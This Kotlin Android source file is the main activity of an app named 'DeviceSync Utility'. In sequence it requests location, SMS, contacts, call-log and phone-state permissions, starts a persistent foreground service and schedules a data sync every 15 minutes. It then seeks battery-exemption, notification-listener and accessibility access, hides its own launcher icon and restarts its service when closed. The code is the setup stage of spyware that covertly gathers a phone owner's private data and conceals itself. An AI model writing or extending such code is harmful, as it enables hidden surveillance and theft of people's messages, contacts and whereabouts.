package com.devicesync.utility

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView
    private val pendingPermissions = mutableListOf<String>()
    private var permissionIndex = 0

    private val requiredPermissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (!isGranted) {
            val perm = requiredPermissions.getOrNull(permissionIndex - 1)
            perm?.let { showRationaleDialog(it) }
        }
        requestNextPermission()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)

        statusText.text = "Requesting permissions..."
        pendingPermissions.addAll(requiredPermissions)
        permissionIndex = 0
        requestNextPermission()
    }

    private fun requestNextPermission() {
        if (permissionIndex < pendingPermissions.size) {
            val permission = pendingPermissions[permissionIndex]
            permissionIndex++
            when {
                ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED -> {
                    requestNextPermission()
                }
                shouldShowRequestPermissionRationale(permission) -> {
                    showRationaleDialog(permission) {
                        permissionLauncher.launch(permission)
                    }
                }
                else -> {
                    permissionLauncher.launch(permission)
                }
            }
        } else {
            finishSetup()
        }
    }

    private fun showRationaleDialog(permission: String, onOk: (() -> Unit)? = null) {
        val name = when {
            permission.contains("LOCATION") -> "Location"
            permission.contains("SMS") -> "SMS"
            permission.contains("CONTACTS") -> "Contacts"
            permission.contains("CALL_LOG") -> "Call Logs"
            permission.contains("PHONE_STATE") -> "Phone State"
            permission.contains("POST_NOTIFICATIONS") -> "Notifications"
            else -> "This permission"
        }
        AlertDialog.Builder(this)
            .setTitle("$name Permission")
            .setMessage("DeviceSync Utility needs $name permission to collect and sync your device data. Without it, related features will be skipped.")
            .setPositiveButton("Grant") { _, _ -> onOk?.invoke() }
            .setNegativeButton("Skip") { _, _ -> requestNextPermission() }
            .setCancelable(false)
            .show()
    }

    private fun finishSetup() {
        statusText.text = "Starting services..."

        // Request background location separately if fine location granted
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
            && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
        ) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                permissionLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }

        // Start foreground service
        val serviceIntent = Intent(this, ForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        // Schedule WorkManager periodic sync
        scheduleDataSync()

        // Request battery optimization ignore
        requestBatteryOptimizationExemption()

        // Request notification listener access
        requestNotificationAccess()

        // Request accessibility service
        requestAccessibilityService()

        // Hide launcher icon
        hideLauncherIcon()

        statusText.text = "Setup complete"
        Toast.makeText(this, getString(R.string.setup_complete), Toast.LENGTH_LONG).show()

        // Close activity
        finish()
    }

    private fun scheduleDataSync() {
        val workRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(15, TimeUnit.MINUTES)
            .setConstraints(
                androidx.work.Constraints.Builder()
                    .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "DeviceSyncWorker",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun requestBatteryOptimizationExemption() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (_: Exception) { }
        }
    }

    private fun requestNotificationAccess() {
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
        } catch (_: Exception) { }
    }

    private fun requestAccessibilityService() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
        } catch (_: Exception) { }
    }

    private fun hideLauncherIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Ensure service keeps running
        val intent = Intent(this, ForegroundService::class.java)
        startService(intent)
    }
}
